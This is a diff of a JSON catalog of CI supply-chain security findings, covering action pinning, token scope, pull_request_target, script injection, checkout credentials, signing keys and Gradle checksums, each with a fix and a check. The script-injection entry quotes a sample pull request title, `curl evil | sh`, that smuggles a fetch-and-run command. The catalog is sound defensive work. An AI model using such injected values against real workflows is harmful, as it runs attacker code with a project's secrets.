@@ -5,7 +5,9 @@
       "title": "Action is pinned to a tag or branch, not a commit SHA",
       "platform": "ci",
       "severity": "high",
-      "profiles": ["L1"],
+      "profiles": [
+        "L1"
+      ],
       "why": "A tag or branch is a label the action's owner can move to different code. In the tj-actions and Trivy attacks, moved tags ran stolen-secret code inside thousands of workflows that never changed a line. GitHub-owned and same-organization actions are reported one level lower; this repository's own code goes to notes.",
       "fix": "Replace the tag with the full 40-character commit SHA and keep the version in a trailing comment. Let a tool such as `pinact run` write the pin, and let Dependabot (with a cooldown) keep it current. Reference this repository's own actions as `./…` or `$/…`.",
       "verify": "Run `pinact run --check` or zizmor's `unpinned-uses` audit: every remote `uses:` in workflows and composite `action.yml` files should end in a 40-character SHA.",
@@ -25,7 +27,9 @@
       "title": "Workflow token permissions are not restricted",
       "platform": "ci",
       "severity": "medium",
-      "profiles": ["L1"],
+      "profiles": [
+        "L1"
+      ],
       "why": "Every run gets a GITHUB_TOKEN. Without a `permissions:` block it gets the repository default, which is read-write on many older organizations, so any hijacked step can push code or change releases.",
       "fix": "Add `permissions: {}` at the top of the workflow so the token can do nothing, then grant each job only what it needs. Never use `write-all`.",
       "verify": "Open a run's \"Set up job\" log and check the GITHUB_TOKEN permissions list matches what the job needs.",
@@ -45,8 +49,10 @@
       "title": "pull_request_target workflow checks out the pull request's code",
       "platform": "ci",
       "severity": "critical",
-      "profiles": ["L1"],
-      "why": "`pull_request_target` runs with your secrets and a write token even for pull requests from forks. Checking out and building the fork's code hands both to whoever opened the pull request, as happened to Ultralytics, Nx, and TanStack. A job that keeps forks out is reported as high.",
+      "profiles": [
+        "L1"
+      ],
+      "why": "`pull_request_target` runs with your secrets and a write token even for pull requests from forks. Checking out and building the fork's code hands both to whoever opened the pull request, as happened to Ultralytics, Nx, and TanStack. A job that keeps forks out is reported as high, or medium when no later step runs the checked-out code.",
       "fix": "Use `pull_request` for anything that builds or tests contributed code. If you need `pull_request_target`, never check out or run the fork's code in that job, and never let it write a cache or artifact another workflow uses.",
       "verify": "Search the workflow for `pull_request_target` and confirm no job in it checks out `github.event.pull_request.head.*` or runs `gh pr checkout`.",
       "effort": "hours",
@@ -65,7 +71,9 @@
       "title": "Untrusted event text is pasted into a run script",
       "platform": "ci",
       "severity": "high",
-      "profiles": ["L1"],
+      "profiles": [
+        "L1"
+      ],
       "why": "GitHub replaces `${{ }}` before the shell runs, so a pull request title, issue body, or branch name becomes part of your script. A title such as `x\"; curl evil | sh` then runs as your workflow, with its token and secrets. Free-text dispatch inputs, which only writers can set, are reported as medium.",
       "fix": "Pass the value through `env:` and read it as a quoted shell variable, so it stays data.",
       "verify": "Run zizmor (`template-injection` audit) or actionlint; no `run:` block should expand attacker-controlled fields (titles, bodies, branch names, commit messages, `github.head_ref`) directly.",
@@ -85,7 +93,9 @@
       "title": "actions/checkout leaves the job token on disk",
       "platform": "ci",
       "severity": "medium",
-      "profiles": ["L1"],
+      "profiles": [
+        "L1"
+      ],
       "why": "By default `actions/checkout` leaves the job token in the workspace's git config (from v6, in a credentials file under `$RUNNER_TEMP` that `.git/config` includes). Every later step, including third-party actions and build scripts, can read it, and with older versions an uploaded artifact of the workspace can leak it.",
       "fix": "Set `persist-credentials: false` on every checkout. Only a job that pushes back to the repository needs the token: set `persist-credentials: true` there on purpose, or pass the token to that one command.",
       "verify": "In a test run, add a step `git config --get-regexp 'http.*extraheader'`; it should print nothing. zizmor's `artipacked` audit also flags checkouts that keep credentials.",
@@ -105,8 +115,10 @@
       "title": "Signing key or signing password is committed to the repository",
       "platform": "ci",
       "severity": "critical",
-      "profiles": ["L1"],
-      "why": "Anyone who can read the repository, or any of its forks and clones, can sign builds as you. Deleting the file later doesn't help: it stays in git history. Nightly or QA keys are reported as high, and debug keystores go to notes.",
+      "profiles": [
+        "L1"
+      ],
+      "why": "Anyone who can read the repository, or any of its forks and clones, can sign builds as you. Deleting the file later doesn't help: it stays in git history. Nightly or QA keys are reported as high, and debug keystores go to notes. A keystore whose password stays out of the repository is reported one level lower.",
       "fix": "Rotate first: request an upload key reset in Play Console, or revoke the certificate or API key. Then remove the file from history, store the keystore base64-encoded in the CI secret store, decode it at build time, and read passwords from environment variables.",
       "verify": "Run `git log --all -- '*.jks' '*.keystore' '*.p12' '*.p8' key.properties` and confirm nothing comes back after the history rewrite.",
       "effort": "hours",
@@ -125,7 +137,9 @@
       "title": "Gradle wrapper download is not checked against a SHA-256",
       "platform": "ci",
       "severity": "low",
-      "profiles": ["L1"],
+      "profiles": [
+        "L1"
+      ],
       "why": "Without `distributionSha256Sum`, the wrapper runs whatever Gradle distribution the download URL returns. A swapped distribution runs with full access to your build and its signing secrets.",
       "fix": "Add `distributionSha256Sum` to `gradle/wrapper/gradle-wrapper.properties`, using the checksum published for that exact Gradle version. `./gradlew wrapper --gradle-version <v> --gradle-distribution-sha256-sum <sha>` writes it for you.",
       "verify": "Change one character of the checksum and run `./gradlew help` on a clean machine: the download should fail verification.",
@@ -145,7 +159,9 @@
       "title": "No dependency lockfile is committed",
       "platform": "ci",
       "severity": "info",
-      "profiles": ["L1"],
+      "profiles": [
+        "L1"
+      ],
       "why": "Without a lockfile, the same build file can resolve a different dependency version next month, including a malicious one, and nobody notices because no file changed.",
       "fix": "Enable Gradle dependency locking and commit each module's `gradle.lockfile`, or commit `gradle/verification-metadata.xml` with `<verify-metadata>true</verify-metadata>`. For Swift packages, commit `Package.resolved`; libraries others depend on may leave it out on purpose.",
       "verify": "Run `./gradlew dependencies --write-locks`, commit the result, and confirm a later build fails if a resolved version changes.",
